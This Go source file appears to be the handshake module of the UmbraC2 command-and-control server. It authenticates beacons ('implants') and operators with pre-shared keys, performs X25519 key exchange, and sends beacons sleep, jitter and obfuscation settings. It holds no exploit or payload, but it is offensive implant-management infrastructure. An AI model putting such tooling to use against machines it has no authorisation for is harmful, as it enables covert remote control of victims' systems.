package link

import (
	"crypto/subtle"
	"fmt"
	"log/slog"
	"time"

	"github.com/thesyntax1/UmbraC2/server/internal/config"
	"github.com/thesyntax1/UmbraC2/server/internal/crypt"
	"github.com/thesyntax1/UmbraC2/server/internal/hub"
	"github.com/thesyntax1/UmbraC2/server/internal/keyring"
	"github.com/thesyntax1/UmbraC2/server/internal/session"
	"github.com/thesyntax1/UmbraC2/server/internal/upk"
	"github.com/thesyntax1/UmbraC2/server/internal/wire"
)

// HandshakeError explains why a peer was rejected.
type HandshakeError struct {
	Reason string
	Fatal  bool // true when the peer is abusive rather than merely wrong
}

func (e *HandshakeError) Error() string { return e.Reason }

func handshakeErr(format string, args ...any) *HandshakeError {
	return &HandshakeError{Reason: fmt.Sprintf(format, args...)}
}

// HelloInfo is the authenticated result of a handshake.
type HelloInfo struct {
	Role      byte
	ID        string
	Meta      map[string]any
	Suite     byte
	KeyName   string // which keyring entry authenticated the peer
	ClientIP  string
	SessionID []byte // 128-bit session id handed to the peer in HELLO_ACK

	// The fields of the second version of the handshake.
	//
	// A beacon that speaks the first version leaves them empty; the
	// server answers in the version the peer asked for, so an old beacon
	// never sees a field it does not understand.
	Version        int
	Caps           []string
	ImplantVersion string
	ABI            int
	Platform       map[string]any
}

// helloVersions are the handshake versions this server speaks, newest
// first.
//
// The server accepts every version in this list and answers in the
// version the peer asked for.  The matrix is in docs/PROTOCOL.md.
var helloVersions = []int{int(wire.HelloVersion), 1}

// candidate is one (suite, key) pair the server is willing to try.
type candidate struct {
	suite   byte
	psi     []byte
	keyName string
	role    byte // role this key is allowed to claim
	// boundID is the agent id this key may claim.  An empty boundID is a
	// fleet key: it may claim any name.  A key that is bound to one id
	// proves the identity of the host, so a stolen key impersonates one
	// machine and not the whole fleet.
	boundID string
}

// PreAck runs once the peer is authenticated and before the HELLO_ACK is
// written.
//
// The operator listener uses it to subscribe the console to the event
// stream: the console believes it is connected as soon as the HELLO_ACK
// arrives, so an event that is emitted in the same breath has to find a
// subscriber already.  The function it returns undoes the setup, and the
// handshake calls it when the handshake fails.  When the handshake succeeds
// the caller owns the setup and has to release it.
type PreAck func(info *HelloInfo) (cleanup func(), err error)

// Handshake performs the server side of the protocol handshake.
//
// The server cannot know which PSK a peer used before decrypting the HELLO, so
// it tries every configured key against the offered suites. With a handful of
// operator tokens this is microseconds; the outer attempt limit keeps it from
// becoming an oracle.
func Handshake(stream FrameStream, cfg *config.Config, ring *keyring.Keyring, log *slog.Logger, peerAddr string, pre ...PreAck) (*session.Session, *HelloInfo, error) {
	raw, err := stream.ReadFrame()
	if err != nil {
		return nil, nil, handshakeErr("read HELLO: %v", err)
	}

	// The candidates come from the runtime keyring, not from the
	// configuration: a rotation that happened while the server runs has to
	// be honoured, and the previous key has to keep working while the
	// fleet catches up.
	ring = ensureKeyring(ring, cfg)
	agentKeys := ring.AgentCandidates()
	operatorKeys := ring.OperatorCandidates()
	cands := make([]candidate, 0, 4*(1+len(operatorKeys)))
	for _, suite := range crypt.ServerSuites() {
		// The keys that are bound to an agent id come first: a beacon
		// that has its own key is served by it, and the fleet key is
		// only the fallback for the beacons that were built before the
		// per-agent keys existed.
		for _, agent := range ring.AgentKeyCandidates() {
			cands = append(cands, candidate{
				suite:   suite,
				psi:     agent.PSK,
				keyName: "agent:" + agent.ID,
				role:    crypt.RoleAgent,
				boundID: agent.ID,
			})
		}
		for _, psi := range agentKeys {
			cands = append(cands, candidate{suite: suite, psi: psi, keyName: "agent", role: crypt.RoleAgent})
		}
		for _, op := range operatorKeys {
			cands = append(cands, candidate{suite: suite, psi: op.Token, keyName: op.Name, role: crypt.RoleOperator})
		}
	}

	var (
		hello    map[string]any
		boot     *session.Session
		chosen   candidate
		lastErr  error
		accepted bool
	)
	for _, cand := range cands {
		bs, err := session.NewBootstrap(cand.psi, cand.suite, true)
		if err != nil {
			lastErr = err
			continue
		}
		msgType, plain, err := bs.OpenFrame(raw)
		if err != nil {
			lastErr = err
			continue
		}
		if msgType != wire.MsgHello {
			return nil, nil, handshakeErr("expected HELLO, got %s", wire.TypeName(msgType))
		}
		if len(plain) < 2 || plain[0] != wire.MarkerHello {
			return nil, nil, handshakeErr("bad HELLO payload marker")
		}
		v, err := upk.DecodeExact(plain[1:])
		if err != nil {
			return nil, nil, handshakeErr("decode HELLO: %v", err)
		}
		m, ok := v.(map[string]any)
		if !ok {
			return nil, nil, handshakeErr("HELLO body must be a map")
		}
		hello, boot, chosen, accepted = m, bs, cand, true
		break
	}
	if !accepted {
		return nil, nil, &HandshakeError{Reason: fmt.Sprintf("no key/suite accepted HELLO: %v", lastErr), Fatal: true}
	}

	info, err := verifyHello(hello, chosen, cfg)
	if err != nil {
		log.Warn("handshake rejected", "peer", peerAddr, "key", chosen.keyName, "reason", err)
		return nil, nil, err
	}
	info.ClientIP = peerAddr
	// The last use of an operator token is stamped here: the moment it
	// authenticated is the moment it was used, and an admin who wants to
	// know which of the tokens nobody needs any more asks the keyring.
	if info.Role == crypt.RoleOperator {
		ring.Touch(info.ID)
	}

	serverKP, err := crypt.NewX25519Keypair()
	if err != nil {
		return nil, nil, handshakeErr("generate keypair: %v", err)
	}
	serverNonce, err := crypt.RandomBytes(16)
	if err != nil {
		return nil, nil, handshakeErr("generate nonce: %v", err)
	}
	sessionID, err := crypt.RandomBytes(16)
	if err != nil {
		return nil, nil, handshakeErr("generate session id: %v", err)
	}
	clientPub := hello["pub"].([]byte)
	clientNonce := hello["cn"].([]byte)

	shared, err := serverKP.Shared(clientPub)
	if err != nil {
		return nil, nil, handshakeErr("x25519: %v", err)
	}
	prk, material, err := crypt.DeriveSession(shared, clientNonce, serverNonce)
	if err != nil {
		return nil, nil, handshakeErr("derive session: %v", err)
	}

	ackAuth, err := crypt.AckAuth(chosen.psi, []byte(info.ID), clientPub, serverKP.Pub, clientNonce, serverNonce, sessionID, info.Suite)
	if err != nil {
		return nil, nil, handshakeErr("ack auth: %v", err)
	}
	sleep, jitter := cfg.Server.Beacon.Sleep, cfg.Server.Beacon.Jitter
	ack := upk.Map{
		"v":     info.Version,
		"pub":   serverKP.Pub,
		"sn":    serverNonce,
		"sid":   sessionID,
		"suite": info.Suite,
		"auth":  ackAuth,
		"name":  "umbra-server",
		"cfg":   upk.Map{"sleep": sleep, "jitter": jitter, "obf": true},
		"meta":  upk.Map{"ver": hub.Version},
	}
	if info.Version >= 2 {
		// What the server speaks, what it accepts and the limits of the
		// queue: a beacon that knows the limits can pace itself.
		ack["abi"] = uint64(wire.ABIVersion)
		compat := make([]any, 0, len(helloVersions))
		for _, v := range helloVersions {
			compat = append(compat, uint64(v))
		}
		ack["compat"] = compat
		ack["limits"] = queueLimits(cfg)
	}
	// The peer is authenticated.  A hook may still put the peer in place
	// before the answer goes out: the console believes it is connected as
	// soon as the HELLO_ACK arrives, so an event emitted in the same breath
	// has to find a subscriber already.
	var undo func()
	if len(pre) > 0 && pre[0] != nil {
		cleanup, err := pre[0](info)
		if err != nil {
			return nil, nil, handshakeErr("peer setup: %v", err)
		}
		undo = cleanup
	}
	body := append([]byte{wire.MarkerHelloAck}, mustEncode(ack)...)
	frame, err := boot.Encrypt(wire.MsgHelloAck, body)
	if err != nil {
		if undo != nil {
			undo()
		}
		return nil, nil, handshakeErr("seal HELLO_ACK: %v", err)
	}
	if err := stream.WriteFrame(frame); err != nil {
		if undo != nil {
			undo()
		}
		return nil, nil, handshakeErr("write HELLO_ACK: %v", err)
	}

	sess, err := session.New(info.Suite, material, true, false, prk)
	if err != nil {
		if undo != nil {
			undo()
		}
		return nil, nil, handshakeErr("create session: %v", err)
	}
	info.SessionID = sessionID
	return sess, info, nil
}

// verifyHello validates every unauthenticated-then-authenticated field.
func verifyHello(hello map[string]any, cand candidate, cfg *config.Config) (*HelloInfo, error) {
	role, ok := number(hello["role"])
	if !ok {
		return nil, handshakeErr("missing role")
	}
	id, ok := hello["id"].(string)
	if !ok || id == "" || len(id) > 128 {
		return nil, handshakeErr("invalid identity")
	}
	// The identity is a name, not a payload: it is rendered by every
	// console, stored in every ledger and copied into every dossier, so
	// the alphabet is settled once here instead of being escaped by every
	// reader for ever.
	if !validIdentity(id) {
		return nil, identityRefusal(id)
	}
	pub, ok := hello["pub"].([]byte)
	if !ok || len(pub) != 32 {
		return nil, handshakeErr("invalid client public key")
	}
	cn, ok := hello["cn"].([]byte)
	if !ok || len(cn) != 16 {
		return nil, handshakeErr("invalid client nonce")
	}
	ts, ok := number(hello["ts"])
	if !ok {
		return nil, handshakeErr("missing timestamp")
	}
	skew := time.Since(time.Unix(int64(ts), 0))
	if skew < 0 {
		skew = -skew
	}
	if skew > cfg.MaxSkew() {
		return nil, handshakeErr("handshake timestamp outside allowed skew (%s)", skew)
	}
	suiteID, ok := number(hello["suite"])
	if !ok || byte(suiteID) != cand.suite {
		return nil, handshakeErr("suite mismatch in HELLO")
	}

	// The key that decrypted the HELLO must match the claimed role, and an
	// operator token must match the identity it was issued for.
	if byte(role) != cand.role {
		return nil, handshakeErr("role %d not allowed for key %q", role, cand.keyName)
	}
	if cand.role == crypt.RoleOperator && id != cand.keyName {
		return nil, handshakeErr("operator token used by %q but issued to %q", id, cand.keyName)
	}
	if cand.role == crypt.RoleAgent && id == "" {
		return nil, handshakeErr("agent identity required")
	}
	// A key that is bound to one agent id may not claim another one.
	if cand.role == crypt.RoleAgent && cand.boundID != "" && id != cand.boundID {
		return nil, handshakeErr("the key is bound to agent %q, not %q", cand.boundID, id)
	}

	want, err := crypt.HelloAuth(cand.psi, byte(role), []byte(id), pub, cn, ts, byte(suiteID))
	if err != nil {
		return nil, handshakeErr("hello auth: %v", err)
	}
	got, _ := hello["auth"].([]byte)
	if subtle.ConstantTimeCompare(want, got) != 1 {
		return nil, handshakeErr("client authentication failed (bad PSK?)")
	}

	meta := map[string]any{}
	if m, ok := hello["meta"].(map[string]any); ok {
		// Every string a beacon sends about its host is cleaned before it
		// is stored: control characters and the five characters a markup
		// reader treats as structure are removed, and the length is
		// bounded.  A host name with an accent survives; a host name that
		// wants to be a tag does not.
		meta = cleanMetaMap(m)
	}
	v, _ := number(hello["v"])
	if !helloVersionKnown(int(v)) {
		return nil, handshakeErr("unsupported HELLO version %d", v)
	}
	// The capability list is a field of its own in the second version;
	// the first version kept it in the metadata.
	caps := metaCaps(hello["caps"])
	if len(caps) == 0 {
		caps = metaCaps(meta["caps"])
	}
	platform := map[string]any{}
	if m, ok := hello["plat"].(map[string]any); ok {
		platform = m
	}
	implantVersion, _ := hello["iver"].(string)
	implantVersion = cleanMeta(implantVersion)
	abi, _ := number(hello["abi"])
	return &HelloInfo{
		Role:           byte(role),
		ID:             id,
		Meta:           meta,
		Suite:          byte(suiteID),
		KeyName:        cand.keyName,
		Version:        int(v),
		Caps:           caps,
		ImplantVersion: implantVersion,
		ABI:            int(abi),
		Platform:       platform,
	}, nil
}

// ensureKeyring returns the keyring to use, building one out of the
// configuration when the caller has none.
//
// A server that was wired up before the keyring existed still works: the
// keyring is built from the configuration and the commands that rotate
// the keys need a real one.
func ensureKeyring(ring *keyring.Keyring, cfg *config.Config) *keyring.Keyring {
	if ring != nil {
		return ring
	}
	if cfg == nil {
		return keyring.New(nil, "", nil, "")
	}
	return keyring.FromConfig(cfg.Keyring)
}

// queueLimits is what the server tells a beacon about the queue.
//
// A beacon that knows the limits can pace itself: it does not have to
// take work it cannot run, and it does not have to ask.
func queueLimits(cfg *config.Config) upk.Map {
	queue := config.Queue{}
	if cfg != nil {
		queue = cfg.Server.Queue
	}
	// A configuration that says nothing keeps the defaults: a beacon
	// must never be told that there is no limit.
	inFlight := queue.MaxInFlightPerAgent
	if inFlight <= 0 {
		inFlight = config.DefaultMaxInFlightPerAgent
	}
	perMinute := queue.MaxDeliverPerMinutePerAgent
	if perMinute <= 0 {
		perMinute = config.DefaultMaxDeliverPerMinutePerAgent
	}
	perSecond := queue.MaxDeliverPerSecond
	if perSecond <= 0 {
		perSecond = config.DefaultMaxDeliverPerSecond
	}
	attempts := queue.MaxAttempts
	if attempts <= 0 {
		attempts = config.DefaultMaxAttempts
	}
	return upk.Map{
		"max_in_flight_per_agent":          uint64(inFlight),
		"max_deliver_per_minute_per_agent": uint64(perMinute),
		"max_deliver_per_second":           uint64(perSecond),
		"max_attempts":                     uint64(attempts),
	}
}

// helloVersionKnown says whether the server speaks a handshake version.
func helloVersionKnown(v int) bool {
	for _, known := range helloVersions {
		if known == v {
			return true
		}
	}
	return false
}

func mustEncode(m upk.Map) []byte {
	b, err := upk.Encode(m)
	if err != nil {
		panic(fmt.Sprintf("link: encode ack: %v", err))
	}
	return b
}

// number converts the numeric types upk can return into uint64.
func number(v any) (uint64, bool) {
	switch n := v.(type) {
	case uint64:
		return n, true
	case int64:
		if n < 0 {
			return 0, false
		}
		return uint64(n), true
	case int:
		if n < 0 {
			return 0, false
		}
		return uint64(n), true
	default:
		return 0, false
	}
}

// asInt64 converts a upk number to int64.
func asInt64(v any) (int64, bool) {
	switch n := v.(type) {
	case uint64:
		return int64(n), true
	case int64:
		return n, true
	case int:
		return int64(n), true
	default:
		return 0, false
	}
}
